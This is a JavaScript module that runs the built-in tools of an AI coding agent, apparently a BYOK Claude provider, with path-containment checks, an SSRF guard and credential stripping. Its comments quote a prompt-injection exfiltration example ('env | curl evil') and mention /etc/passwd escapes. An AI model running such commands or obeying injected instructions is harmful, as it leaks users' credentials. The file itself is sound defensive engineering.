/**
 * Dispatch a tool_use block from the model to the local executor that
 * implements it. Owns the result shape: returns `{ content, isError }`
 * matching what gets put inside a `tool_result` content block sent
 * back to the API on the next turn.
 *
 * All tools are gated through the caller's permission flow before this
 * runs — by the time we get here, the user has approved the call (or
 * the session is in `auto` mode which auto-approves). We don't do
 * permission gating in here; this module is execution only.
 *
 * Path safety is enforced for file tools by validateRawPathWithinCwd from
 * ws-file-ops/common.js — every file_path is resolved COMPONENT BY COMPONENT
 * (open(2)-faithfully) and confirmed to be inside the session cwd before any
 * read/write happens. Symlink escapes — including a `..` that follows a
 * symlinked component (#6923) — are blocked by walking the RAW path rather than
 * a pre-`resolve()`d one (see common.js + the 2026-04-11 production-readiness
 * audit).
 */

import { isIP } from 'node:net'
import { lookup as dnsLookup } from 'node:dns/promises'
import { validateRawPathWithinCwd } from './ws-file-ops/common.js'
import { executeBash, DEFAULT_BASH_TIMEOUT_MS } from './built-in-tools/bash-exec.js'
import { readFileTool, writeFileTool, editFileTool } from './built-in-tools/file-ops.js'
import {
  GLOB_PATTERN_SHELL_METACHARS,
  buildGlobCommand,
  buildGrepArgs,
  buildGrepCommand,
} from './built-in-tools/tool-transforms.js'
import { TODO_STATUSES, BUILTIN_TOOL_NAMES } from './byok-tools.js'
// #4186: SSRF block-list lives in its own module so the (ip, expected)
// table can grow without bloating this file's WebFetch integration tests.
// The exported helpers retain the same names as the original locals so
// the call sites below read identically.
import { isPrivateOrSpecialIp } from './ssrf-guard.js'

/**
 * Cap on Bash timeout the model can request. 10 minutes is the same
 * ceiling chroxy's Bash tool uses elsewhere — long enough for a slow
 * test suite, short enough to not strand a session if a runaway loop
 * hangs.
 */
const BASH_TIMEOUT_CEILING_MS = 600_000

/**
 * Env vars the model must NEVER see in a Bash subprocess. Centrally
 * the BYOK API key — if a malicious prompt induces the model to run
 * `env | curl evil`, the model exfiltrates the user's API credentials
 * (caught by /agent-review on PR #4060 — see #4069). Plus chroxy's
 * own per-session secrets that are scoped to the WS auth surface.
 *
 * Note: we do NOT redact every var that looks like a secret (e.g.
 * GITHUB_TOKEN, AWS_*). The user might legitimately need those in
 * their shell — they're the workspace owner. Only redact chroxy-
 * specific credentials the model has no business reading.
 */
const SECRET_ENV_DENYLIST = new Set([
  'ANTHROPIC_API_KEY',
  'CLAUDE_CODE_OAUTH_TOKEN',
])

/**
 * Build an env for the Bash/Glob/Grep subprocess that strips chroxy's
 * own secrets. Returns a plain object — pass to executeBash's `env`.
 */
function buildSafeBashEnv() {
  const out = {}
  for (const [k, v] of Object.entries(process.env)) {
    if (SECRET_ENV_DENYLIST.has(k)) continue
    out[k] = v
  }
  return out
}

/**
 * Dispatch a single tool_use block.
 *
 * @param {object} args
 * @param {string} args.toolName       The tool name from the model
 * @param {object} args.input          The tool's input arguments (already parsed JSON)
 * @param {string} args.cwd            Session cwd — anchor for path safety
 * @param {Map} args.cwdRealCache      Per-session cache of resolved real paths
 * @param {number} args.cwdCacheTtl    Cache TTL in ms
 * @param {AbortSignal} [args.signal]  Optional abort signal — Bash exec listens
 * @param {Map}         [args.todoStore]  Per-session TodoWrite list (id → item)
 * @returns {Promise<{ content: string, isError: boolean }>}
 */
export async function executeBuiltinTool({
  toolName,
  input,
  cwd,
  cwdRealCache,
  cwdCacheTtl,
  signal,
  todoStore,
}) {
  try {
    switch (toolName) {
      case 'Read':
        return await runRead({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Write':
        return await runWrite({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Edit':
        return await runEdit({ input, cwd, cwdRealCache, cwdCacheTtl })
      case 'Bash':
        return await runBash({ input, cwd, signal })
      case 'Glob':
        return await runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal })
      case 'Grep':
        return await runGrep({ input, cwd, cwdRealCache, cwdCacheTtl, signal })
      case 'WebFetch':
        return await runWebFetch({ input, signal })
      case 'TodoWrite':
        return runTodoWrite({ input, todoStore })
      default: {
        // Derive the list from BUILTIN_TOOL_NAMES so adding a tool only
        // requires updating byok-tools.js — this message can't drift.
        const known = [...BUILTIN_TOOL_NAMES].sort().join(', ')
        return {
          content: `Unknown tool: ${toolName}. The claude-byok provider ships with: ${known}. MCP and other tools land in follow-up issues.`,
          isError: true,
        }
      }
    }
  } catch (err) {
    // Anything that escapes the per-tool runner becomes an error
    // tool_result so the model can see what went wrong and possibly
    // recover. The error message is sanitized — no stack traces, just
    // the error message line.
    return {
      content: `Tool ${toolName} failed: ${err?.message || String(err)}`,
      isError: true,
    }
  }
}

/** Resolve a tool-supplied path against cwd, then validate it's inside. */
async function safeResolve(filePath, cwd, cwdRealCache, cwdCacheTtl) {
  if (typeof filePath !== 'string' || filePath.length === 0) {
    throw Object.assign(new Error('file_path is required'), { code: 'EINVAL' })
  }
  // #6923 — hand the RAW filePath (its `..` intact) to the component-wise walker.
  // Do NOT pre-`resolve(cwd, filePath)`: `resolve()` collapses a `..` that follows
  // a symlinked component LEXICALLY, so `link/../x` cancelled the symlink before it
  // was followed and an escape via a symlink-out-of-workspace + `..` looked in
  // bounds. validateRawPathWithinCwd walks the raw path open(2)-faithfully so the
  // true (escaping) destination is seen and rejected.
  const { valid, realPath, cwdReal } = await validateRawPathWithinCwd(
    filePath,
    cwd,
    cwdRealCache,
    cwdCacheTtl,
  )
  if (!valid) {
    throw Object.assign(
      new Error(`path outside workspace: ${filePath} resolves to ${realPath}, expected under ${cwdReal}`),
      { code: 'EACCES' },
    )
  }
  return realPath
}

async function runRead({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await readFileTool({
    filePath: realPath,
    offset: input?.offset,
    limit: input?.limit,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  const tail = result.truncatedByLimit
    ? `\n\n[showed ${result.linesReturned} of ${result.totalLines} lines]`
    : ''
  return { content: result.content + tail, isError: false }
}

async function runWrite({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await writeFileTool({
    filePath: realPath,
    content: input?.content,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  return {
    content: `Wrote ${result.bytesWritten} bytes to ${input.file_path}${result.created ? ' (created)' : ''}.`,
    isError: false,
  }
}

async function runEdit({ input, cwd, cwdRealCache, cwdCacheTtl }) {
  const realPath = await safeResolve(input?.file_path, cwd, cwdRealCache, cwdCacheTtl)
  const result = await editFileTool({
    filePath: realPath,
    oldString: input?.old_string,
    newString: input?.new_string,
    replaceAll: input?.replace_all === true,
  })
  if (!result.ok) return { content: `${result.code}: ${result.message}`, isError: true }
  return {
    content: `Replaced ${result.replacements} occurrence(s) in ${input.file_path}.`,
    isError: false,
  }
}

async function runBash({ input, cwd, signal }) {
  const command = input?.command
  if (typeof command !== 'string' || command.length === 0) {
    return { content: 'EINVAL: command is required', isError: true }
  }
  const requested = Number(input?.timeout)
  const timeoutMs = Number.isFinite(requested) && requested > 0
    ? Math.min(requested, BASH_TIMEOUT_CEILING_MS)
    : DEFAULT_BASH_TIMEOUT_MS

  const result = await executeBash({
    command,
    cwd,
    timeoutMs,
    signal,
    env: buildSafeBashEnv(),
  })

  // Build a single text payload — stdout, then stderr (if any), then a
  // status line. The model is the consumer here, so we err on the side
  // of being verbose about timing and exit state.
  const parts = []
  if (result.stdout) parts.push(`stdout:\n${result.stdout}`)
  if (result.stderr) parts.push(`stderr:\n${result.stderr}`)
  const statusBits = []
  if (result.timedOut) statusBits.push(`timed out after ${timeoutMs}ms`)
  if (result.aborted) statusBits.push('aborted')
  if (result.truncated) statusBits.push('output truncated at cap')
  statusBits.push(`exit=${result.exitCode ?? 'killed'}`)
  if (result.signal) statusBits.push(`signal=${result.signal}`)
  statusBits.push(`${result.durationMs}ms`)
  parts.push(`[${statusBits.join(', ')}]`)

  return {
    content: parts.join('\n\n'),
    isError: result.exitCode !== 0 || result.timedOut || result.aborted,
  }
}

// Characters in a glob pattern that allow shell-side command substitution
// or piping (GLOB_PATTERN_SHELL_METACHARS + the command builders live in the
// shared tool-transforms.js, so the host and the docker-byok container reject
// and shell out identically — #4070 / #5882).

async function runGlob({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
  const pattern = input?.pattern
  if (typeof pattern !== 'string' || pattern.length === 0) {
    return { content: 'EINVAL: pattern is required', isError: true }
  }
  if (GLOB_PATTERN_SHELL_METACHARS.test(pattern)) {
    return {
      content: 'EINVAL: glob pattern contains shell-dangerous characters ($, `, ;, |, &, <, >, (, ), \\, newline)',
      isError: true,
    }
  }

  // Realpath-validate the search ROOT against cwd. Pre-fix this was a
  // weak "no ..." check that let absolute paths to /etc through.
  const realRoot = await safeResolveRoot(input?.path, cwd, cwdRealCache, cwdCacheTtl)

  // Shell expansion of `for f in <pattern>` is what produces the file
  // paths. Pattern is now whitelist-validated above, so interpolation
  // is safe.
  const cmd = buildGlobCommand(pattern, realRoot)
  const result = await executeBash({
    command: cmd,
    cwd: realRoot,
    signal,
    timeoutMs: 30_000,
    env: buildSafeBashEnv(),
  })
  if (result.exitCode !== 0 && !result.stdout) {
    return { content: `Glob failed: ${result.stderr || `exit ${result.exitCode}`}`, isError: true }
  }
  const files = result.stdout.split('\n').filter(Boolean)
  if (files.length === 0) return { content: `No matches for ${pattern}`, isError: false }
  return { content: files.join('\n'), isError: false }
}

async function runGrep({ input, cwd, cwdRealCache, cwdCacheTtl, signal }) {
  const pattern = input?.pattern
  if (typeof pattern !== 'string' || pattern.length === 0) {
    return { content: 'EINVAL: pattern is required', isError: true }
  }
  const realRoot = await safeResolveRoot(input?.path, cwd, cwdRealCache, cwdCacheTtl)

  // Prefer ripgrep; fall back to grep. Both honor -i and -n. The if/then/else
  // (NOT `rg || grep`) keeps a no-match rg exit-1 from re-running the search
  // under grep (Copilot review on #4060). executeBash captures the exit code
  // (doesn't reject), so no `; true` mask is needed here. Builders are shared
  // with the docker-byok container Grep (#5882).
  const { ci, ln, globArg } = buildGrepArgs(input)
  const cmd = buildGrepCommand({ pattern, root: realRoot, ci, ln, globArg })

  const result = await executeBash({
    command: cmd,
    cwd: realRoot,
    signal,
    timeoutMs: 60_000,
    env: buildSafeBashEnv(),
  })
  // grep/rg both return exit 1 on "no matches" — that's not an error
  // for our purposes. Only exit 2+ or stderr-without-stdout signals an
  // actual failure.
  if (result.stderr && !result.stdout && result.exitCode !== 1) {
    return { content: `Grep failed: ${result.stderr.trim()}`, isError: true }
  }
  if (!result.stdout) return { content: `No matches for ${pattern}`, isError: false }
  return { content: result.stdout, isError: false }
}

/**
 * Validate that an optional `path` argument (for Glob/Grep search roots)
 * is inside the workspace cwd. Defaults to cwd when unset/empty. Returns
 * the realpath so the caller can pass it to bash safely (the spawned
 * shell uses the realpath, not the original symlinked alias).
 *
 * SECURITY: an earlier draft of this function only rejected literal `..`
 * sequences, which let `Glob { path: '/etc' }` and `Grep { path: '/etc' }`
 * search the entire filesystem and return /etc/passwd etc. Caught by
 * `/agent-review` on PR #4060 — see #4071. Now realpath-validates the
 * path through the same machinery the Read/Write/Edit tools use.
 */
async function safeResolveRoot(p, cwd, cwdRealCache, cwdCacheTtl) {
  if (typeof p !== 'string' || p.length === 0) return cwd
  // #6923 — pass the RAW path; see safeResolve for why pre-`resolve()` is unsafe
  // (lexical `..` collapse hides a symlink+`..` escape).
  const { valid, realPath, cwdReal } = await validateRawPathWithinCwd(
    p,
    cwd,
    cwdRealCache,
    cwdCacheTtl,
  )
  if (!valid) {
    throw Object.assign(
      new Error(`path outside workspace: ${p} resolves to ${realPath}, expected under ${cwdReal}`),
      { code: 'EACCES' },
    )
  }
  return realPath
}

const WEBFETCH_DEFAULT_TIMEOUT_MS = 30_000
const WEBFETCH_TIMEOUT_CEILING_MS = 120_000
const WEBFETCH_MAX_RAW_BYTES = 1_048_576       // 1 MB cap on body read from socket
const WEBFETCH_MAX_OUTPUT_CHARS = 100_000      // 100 KB cap on text returned to model
// #4132: undici's default redirect cap is 20. Ours is tighter so the
// model can't burn its turn on a redirect-loop honeypot — and we
// re-validate scheme + host on every hop, so the loop is also a
// per-hop SSRF gate, not just a count.
const WEBFETCH_MAX_REDIRECT_HOPS = 10

async function isHostAllowed(hostname) {
  if (process.env.CHROXY_WEBFETCH_ALLOW_PRIVATE === '1') return true
  if (typeof hostname !== 'string' || hostname.length === 0) return false
  // URL.hostname returns IPv6 literals WITH square brackets ('[::1]'),
  // and node:net isIP doesn't accept brackets. Strip them before the
  // isIP probe so legitimate public IPv6 URLs aren't all rejected as
  // unresolvable hostnames. (Caught by /agent-review on #4165 — #4166.)
  const probe = hostname.startsWith('[') && hostname.endsWith(']')
    ? hostname.slice(1, -1)
    : hostname
  if (isIP(probe)) return !isPrivateOrSpecialIp(probe)
  try {
    // Resolve ALL addresses (both families). A multi-A host that returns
    // a public IP plus a private IP would otherwise slip past with the
    // single-address default — `fetch` may then pick the private one.
    // Refuse if ANY resolved address is private/special. (Copilot review
    // on #4165.)
    const addresses = await dnsLookup(probe, { all: true })
    if (!Array.isArray(addresses) || addresses.length === 0) return false
    for (const { address } of addresses) {
      if (isPrivateOrSpecialIp(address)) return false
    }
    return true
  } catch {
    // Unresolvable host — refuse rather than letting fetch try.
    return false
  }
}

async function runWebFetch({ input, signal }) {
  const rawUrl = input?.url
  if (typeof rawUrl !== 'string' || rawUrl.length === 0) {
    return { content: 'EINVAL: url is required', isError: true }
  }
  const rawPrompt = input?.prompt
  if (typeof rawPrompt !== 'string' || rawPrompt.length === 0) {
    return { content: 'EINVAL: prompt is required', isError: true }
  }
  let parsed
  try {
    parsed = new URL(rawUrl)
  } catch {
    // #4159: do NOT echo rawUrl here — a URL that fails to parse can
    // still contain userinfo (e.g. `http://alice:hunter2@` fails the
    // host check) and any echo lands in conversation history.
    return { content: 'EINVAL: malformed url (could not be parsed as http(s))', isError: true }
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
    return {
      content: `EINVAL: only http(s) URLs are supported (got ${parsed.protocol})`,
      isError: true,
    }
  }
  // #4133: strip user:pass@ userinfo before either echoing the URL back
  // to the model OR passing it to fetch(). Two reasons:
  //   1. The model's tool_result lands in conversation history and gets
  //      resent to the Anthropic API on the next turn — userinfo in the
  //      URL is a credential exfiltration path.
  //   2. Node fetch refuses URLs containing credentials outright with
  //      an error that itself echoes the credentialed URL, so even the
  //      failure path leaks. Stripping here turns the fetch into an
  //      unauthenticated request — the server may 401 / 403, which is
  //      surfaced cleanly without exposing the creds.
  // #4160: remember whether userinfo was present so the result header
  // can surface a `[userinfo stripped from ...]` marker — a silent strip
  // turns a downstream 401 into a mysterious failure that the model can't
  // diagnose. The marker is the design trade-off worth flagging.
  //
  // #4183: track input-URL strip and redirect-hop strip as SEPARATE flags
  // so the marker can say exactly where the credentials came from. The
  // pre-#4183 single `hadUserinfo` flag produced a marker adjacent to
  // `currentUrl` (which may be a redirect destination), so a reader
  // could plausibly think the marker referred to the displayed URL
  // even when the strip happened on the input or on an earlier hop.
  // Distinguishing the two sources keeps the marker honest in the
  // redirect-chain case without changing where it sits in the result.
  const inputHadUserinfo = Boolean(parsed.username || parsed.password)
  let redirectHadUserinfo = false
  if (inputHadUserinfo) {
    parsed.username = ''
    parsed.password = ''
  }

  const requested = Number(input?.timeout)
  const timeoutMs = Number.isFinite(requested) && requested > 0
    ? Math.min(requested, WEBFETCH_TIMEOUT_CEILING_MS)
    : WEBFETCH_DEFAULT_TIMEOUT_MS

  const ac = new AbortController()
  const timer = setTimeout(() => ac.abort(new Error('timeout')), timeoutMs)
  // Forward an external abort signal (session destroy) into our local
  // controller. If the signal is ALREADY aborted at entry, the listener
  // wouldn't fire — short-circuit so a destroyed session doesn't make an
  // outbound request.
  const onExternalAbort = () => ac.abort(signal.reason)
  if (signal) {
    if (signal.aborted) ac.abort(signal.reason)
    else signal.addEventListener('abort', onExternalAbort, { once: true })
  }

  try {
    // #4132: SSRF check on the initial URL. Done before any network
    // attempt so an attacker can't even confirm a private host is
    // listening on the chroxy host.
    if (!(await isHostAllowed(parsed.hostname))) {
      return {
        content:
          `EACCES: refusing to fetch private/loopback/link-local host (${parsed.hostname}). ` +
          'Set CHROXY_WEBFETCH_ALLOW_PRIVATE=1 to opt in (local dev only — this is an SSRF guard).',
        isError: true,
      }
    }

    // #4132: manual redirect handling so we can re-validate scheme +
    // host on every hop. `redirect: 'follow'` would otherwise honour an
    // attacker's redirect to file:// (well, undici would refuse it
    // with a vague network error) or to a private IP (which undici
    // happily follows).
    let res
    let currentUrl = parsed
    for (let hop = 0; hop <= WEBFETCH_MAX_REDIRECT_HOPS; hop++) {
      res = await fetch(currentUrl.toString(), {
        signal: ac.signal,
        redirect: 'manual',
        headers: { 'user-agent': 'chroxy-webfetch/1.0' },
      })
      if (res.status < 300 || res.status >= 400) break
      const loc = res.headers.get('location')
      // Drain the body so the connection can return to the pool.
      try { await res.body?.cancel() } catch { /* connection already torn down */ }
      if (!loc) {
        return { content: `WebFetch redirect ${res.status} with no Location header`, isError: true }
      }
      let nextUrl
      try {
        nextUrl = new URL(loc, currentUrl)
      } catch {
        return { content: `WebFetch refused redirect: malformed Location header`, isError: true }
      }
      // #4182 (Copilot review): a Location header can introduce
      // `user:pass@` userinfo on any hop. Strip it BEFORE the next fetch
      // — Node fetch refuses credentialed URLs with an error that echoes
      // the credentialed URL, which would then leak via the catch-all
      // `WebFetch failed: ${err.message}` path.
      // #4183: set `redirectHadUserinfo` (separate from `inputHadUserinfo`)
      // so the result marker can name where the credentials came from
      // rather than ambiguously claiming "userinfo stripped" next to a
      // URL that may not itself have carried any.
      if (nextUrl.username || nextUrl.password) {
        redirectHadUserinfo = true
        nextUrl.username = ''
        nextUrl.password = ''
      }
      if (nextUrl.protocol !== 'http:' && nextUrl.protocol !== 'https:') {
        // The Location header is attacker-controlled, so don't echo it
        // verbatim — that's a prompt-injection surface AND would leak
        // sensitive paths (e.g. file:///etc/passwd). Just report the
        // scheme. (Copilot review on #4165.)
        return {
          content: `WebFetch refused redirect scheme: only http(s) allowed (got ${nextUrl.protocol})`,
          isError: true,
        }
      }
      if (!(await isHostAllowed(nextUrl.hostname))) {
        return {
          content:
            `WebFetch refused redirect to private/loopback/link-local host (${nextUrl.hostname}). ` +
            'Set CHROXY_WEBFETCH_ALLOW_PRIVATE=1 to opt in.',
          isError: true,
        }
      }
      if (hop === WEBFETCH_MAX_REDIRECT_HOPS) {
        return {
          content: `WebFetch hit redirect cap: too many redirects (>${WEBFETCH_MAX_REDIRECT_HOPS} hops)`,
          isError: true,
        }
      }
      currentUrl = nextUrl
    }

    // Compute the marker AFTER the redirect loop so it reflects any
    // userinfo stripped on a hop (#4182 Copilot review). #4183: name the
    // SOURCE of the stripped credentials so the marker is unambiguous
    // when `currentUrl` is a redirect destination that didn't itself
    // carry userinfo. The four arms are mutually exclusive at the
    // boolean level; the cross case is a single combined message rather
    // than two stacked markers.
    const userinfoMarker = (() => {
      if (inputHadUserinfo && redirectHadUserinfo) {
        return ' [userinfo stripped from input URL and redirect Location]'
      }
      if (inputHadUserinfo) return ' [userinfo stripped from input URL]'
      if (redirectHadUserinfo) return ' [userinfo stripped from redirect Location]'
      return ''
    })()

    if (!res.ok) {
      return {
        content: `HTTP ${res.status} ${res.statusText} from ${currentUrl.toString()}${userinfoMarker}`,
        isError: true,
      }
    }

    const ctype = (res.headers.get('content-type') || '').toLowerCase()
    if (isBinaryContentType(ctype)) {
      return {
        content: `Unsupported content-type for WebFetch: ${ctype || 'unknown'} (binary content is not extracted to text).`,
        isError: true,
      }
    }

    // #4134: respect the declared charset rather than blindly utf-8.
    // Legacy sites still serve ISO-8859-1, Shift_JIS, GB2312, etc.; an
    // unconditional utf-8 decode produces mojibake that the model
    // can't reason about. Falls back to utf-8 when charset is missing,
    // unknown, or rejected by TextDecoder.
    const charset = pickCharset(ctype)
    const raw = await readBodyCapped(res, WEBFETCH_MAX_RAW_BYTES, charset)
    const isHtml = ctype.includes('text/html') || ctype.includes('application/xhtml')
    const text = isHtml ? stripHtmlToText(raw.text) : raw.text
    const { output, outputTruncated } = capOutput(text, WEBFETCH_MAX_OUTPUT_CHARS)

    // Distinct markers so the model can tell whether it lost data at the
    // socket (raw cap) or after HTML extraction (output cap). Output cap
    // takes precedence in the marker because that's the final visible cut.
    let marker = ''
    if (outputTruncated) {
      marker = `\n\n[truncated at output cap: ${WEBFETCH_MAX_OUTPUT_CHARS} chars]`
    } else if (raw.truncated) {
      marker = `\n\n[truncated at raw body cap: ${WEBFETCH_MAX_RAW_BYTES} bytes]`
    }

    return {
      content: `Prompt: ${rawPrompt}\nURL: ${currentUrl.toString()}${userinfoMarker}\n\n${output}${marker}`,
      isError: false,
    }
  } catch (err) {
    // ac.abort(reason) surfaces `reason` as the thrown error rather than
    // wrapping it in AbortError. The most reliable signal that we aborted
    // is the controller's signal.aborted state — message-string matching
    // misses arbitrary user-supplied reasons (e.g. "session destroyed").
    if (ac.signal.aborted) {
      return { content: `WebFetch timed out or aborted after ${timeoutMs}ms`, isError: true }
    }
    return { content: `WebFetch failed: ${err?.message || String(err)}`, isError: true }
  } finally {
    clearTimeout(timer)
    if (signal) signal.removeEventListener('abort', onExternalAbort)
  }
}

function isBinaryContentType(ctype) {
  if (!ctype) return false
  if (ctype.startsWith('text/')) return false
  if (ctype.includes('json') || ctype.includes('xml') || ctype.includes('javascript')
      || ctype.includes('yaml') || ctype.includes('+text')) return false
  return true
}

/**
 * Pick a TextDecoder-compatible charset label from a Content-Type header.
 * Returns 'utf-8' when missing, unparseable, or rejected by TextDecoder
 * (so the caller never has to handle a thrown constructor).
 */
function pickCharset(ctype) {
  if (!ctype) return 'utf-8'
  // Match `charset=foo` allowing quoted values per RFC 7231. Anchor on
  // a parameter-boundary (start-of-string or `;`) so a contrived header
  // like `text/html; xcharset=fakeout` can't have its tail matched and
  // mistaken for the real `charset` parameter. (#4162)
  const m = ctype.match(/(?:^|;)\s*charset\s*=\s*"?([\w.:+-]+)"?/i)
  if (!m) return 'utf-8'
  const label = m[1]
  try {
    // Constructor throws if the label is unknown to the WHATWG registry.
    // We only use the throw signal — `new TextDecoder(label)` itself is
    // not retained; the real decoder is built per-call in readBodyCapped.
    new TextDecoder(label)
    return label
  } catch {
    return 'utf-8'
  }
}

async function readBodyCapped(res, maxBytes, charset = 'utf-8') {
  // pickCharset has already validated the label, so this can't throw.
  const decoder = new TextDecoder(charset)
  const reader = res.body?.getReader()
  if (!reader) {
    // Defensive fallback for the (unreachable in practice) case where
    // fetch returns no body stream. Use arrayBuffer + TextDecoder so
    // both paths apply the same charset AND the same byte-based cap —
    // res.text() would (a) hard-wire utf-8 in undici and (b) measure
    // the cap in chars, not bytes. Keeps the contract consistent.
    const ab = await res.arrayBuffer()
    const bytes = Buffer.from(ab)
    if (bytes.byteLength > maxBytes) {
      return { text: decoder.decode(bytes.subarray(0, maxBytes)), truncated: true }
    }
    return { text: decoder.decode(bytes), truncated: false }
  }
  const chunks = []
  let total = 0
  let truncated = false
  while (true) {
    const { done, value } = await reader.read()
    if (done) break
    if (!value) continue
    total += value.byteLength
    if (total > maxBytes) {
      const overflow = total - maxBytes
      chunks.push(value.subarray(0, value.byteLength - overflow))
      truncated = true
      try { await reader.cancel() } catch { /* fetch already winding down */ }
      break
    }
    chunks.push(value)
  }
  const buf = Buffer.concat(chunks.map((c) => Buffer.from(c)))
  return { text: decoder.decode(buf), truncated }
}

const HTML_ENTITY_MAP = {
  '&amp;': '&',
  '&lt;': '<',
  '&gt;': '>',
  '&quot;': '"',
  '&apos;': "'",
  '&#39;': "'",
  '&nbsp;': ' ',
}

function stripHtmlToText(html) {
  // 1. Drop <script> and <style> blocks completely (body and all).
  let s = html
    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '')
    .replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, '')
    .replace(/<!--[\s\S]*?-->/g, '')
  // 2. Treat block-level tags as line breaks so paragraphs don't merge.
  s = s.replace(/<\/?(p|div|h[1-6]|li|tr|br|hr|section|article|header|footer|nav|aside)\b[^>]*>/gi, '\n')
  // 3. Strip remaining tags.
  s = s.replace(/<[^>]+>/g, '')
  // 4. Decode named entities + numeric (decimal + hex) entities.
  s = s.replace(/&(?:amp|lt|gt|quot|apos|#39|nbsp);/g, (m) => HTML_ENTITY_MAP[m])
  s = s.replace(/&#(\d+);/g, (_, n) => safeFromCodePoint(Number(n)))
  s = s.replace(/&#x([0-9a-fA-F]+);/g, (_, h) => safeFromCodePoint(parseInt(h, 16)))
  // 5. Collapse whitespace per line + trim aggressive blank-line runs.
  s = s.split('\n').map((line) => line.replace(/[ \t]+/g, ' ').trim()).join('\n')
  s = s.replace(/\n{3,}/g, '\n\n').trim()
  return s
}

// Unicode code points are 0..0x10FFFF and the surrogate range 0xD800..0xDFFF
// is reserved (passing those to fromCodePoint also throws). Return empty
// string for out-of-range values so a malicious entity like &#9999999999;
// can't crash the entire WebFetch.
function safeFromCodePoint(code) {
  if (!Number.isFinite(code) || code < 0 || code > 0x10FFFF) return ''
  if (code >= 0xD800 && code <= 0xDFFF) return ''
  return String.fromCodePoint(code)
}

function capOutput(text, maxChars) {
  if (text.length <= maxChars) {
    return { output: text, outputTruncated: false }
  }
  return { output: text.slice(0, maxChars), outputTruncated: true }
}

/**
 * Merge a partial todo list into the session's `todoStore` (Map keyed by
 * id). Items in the call replace existing entries with the same id;
 * items not mentioned in the call are preserved (merge semantics — see
 * #4051 acceptance criteria). Validates each item before mutating so a
 * mid-list invalid entry doesn't half-apply the update.
 */
function runTodoWrite({ input, todoStore }) {
  if (!todoStore || !(todoStore instanceof Map)) {
    return {
      content: 'EINTERNAL: TodoWrite requires a session-scoped store (byok-session.js wires this).',
      isError: true,
    }
  }
  const todos = input?.todos
  if (!Array.isArray(todos)) {
    return { content: 'EINVAL: todos must be an array', isError: true }
  }

  // Validate every item BEFORE mutating so a bad item halfway through
  // doesn't leave the store in a partially-applied state.
  const seenIds = new Set()
  for (let i = 0; i < todos.length; i++) {
    const t = todos[i]
    if (!t || typeof t !== 'object') {
      return { content: `EINVAL: todos[${i}] must be an object`, isError: true }
    }
    if (typeof t.id !== 'string' || t.id.length === 0) {
      return { content: `EINVAL: todos[${i}].id is required (string)`, isError: true }
    }
    // #4138: reject duplicate ids within a single call. A duplicate is
    // almost certainly a model bug; rejecting it lets the model see the
    // mistake and self-correct rather than letting the last write win
    // silently. Across separate calls, merge-by-id is unchanged.
    // JSON.stringify on the id (same shape used for `status` below) keeps
    // the error parseable when an id contains quotes / newlines / control
    // chars — raw single-quotes would mangle.
    if (seenIds.has(t.id)) {
      return {
        content: `EINVAL: todos[${i}].id ${JSON.stringify(t.id)} duplicates an earlier entry in this call`,
        isError: true,
      }
    }
    seenIds.add(t.id)
    if (typeof t.content !== 'string' || t.content.length === 0) {
      return { content: `EINVAL: todos[${i}].content is required (string)`, isError: true }
    }
    if (typeof t.status !== 'string' || !TODO_STATUSES.has(t.status)) {
      return {
        content: `EINVAL: todos[${i}].status must be one of pending|in_progress|completed (got ${JSON.stringify(t.status)})`,
        isError: true,
      }
    }
    if (t.activeForm !== undefined && typeof t.activeForm !== 'string') {
      return { content: `EINVAL: todos[${i}].activeForm must be a string when present`, isError: true }
    }
  }

  // Apply the merge.
  for (const t of todos) {
    const entry = { id: t.id, content: t.content, status: t.status }
    if (typeof t.activeForm === 'string') entry.activeForm = t.activeForm
    todoStore.set(t.id, entry)
  }

  // Build a readable summary from the FULL current list (post-merge).
  // The model already sees the call in its history; this confirmation
  // exists so a partial call still surfaces unrelated items. The output
  // is capped so a runaway list (or pathologically long `content`)
  // doesn't balloon conversation history toward token-limit cliffs —
  // the full Map stays server-side; only the rendered summary is capped.
  const all = [...todoStore.values()]
  const counts = { pending: 0, in_progress: 0, completed: 0 }
  for (const t of all) counts[t.status]++

  const header = `Todo list (${all.length} items): ${counts.in_progress} in progress, ${counts.pending} pending, ${counts.completed} completed`
  const visible = all.slice(0, TODOWRITE_MAX_ITEMS_RENDERED)
  const lines = [header]
  for (const t of visible) {
    const marker = t.status === 'completed' ? '[x]' : t.status === 'in_progress' ? '[~]' : '[ ]'
    const content = t.content.length > TODOWRITE_MAX_CONTENT_RENDERED
      ? t.content.slice(0, TODOWRITE_MAX_CONTENT_RENDERED) + '…'
      : t.content
    lines.push(`  ${marker} ${content} (${t.id})`)
  }
  if (all.length > visible.length) {
    lines.push(`  … (showing first ${visible.length} of ${all.length}; full list retained server-side)`)
  }
  return { content: lines.join('\n'), isError: false }
}

const TODOWRITE_MAX_ITEMS_RENDERED = 100
const TODOWRITE_MAX_CONTENT_RENDERED = 200
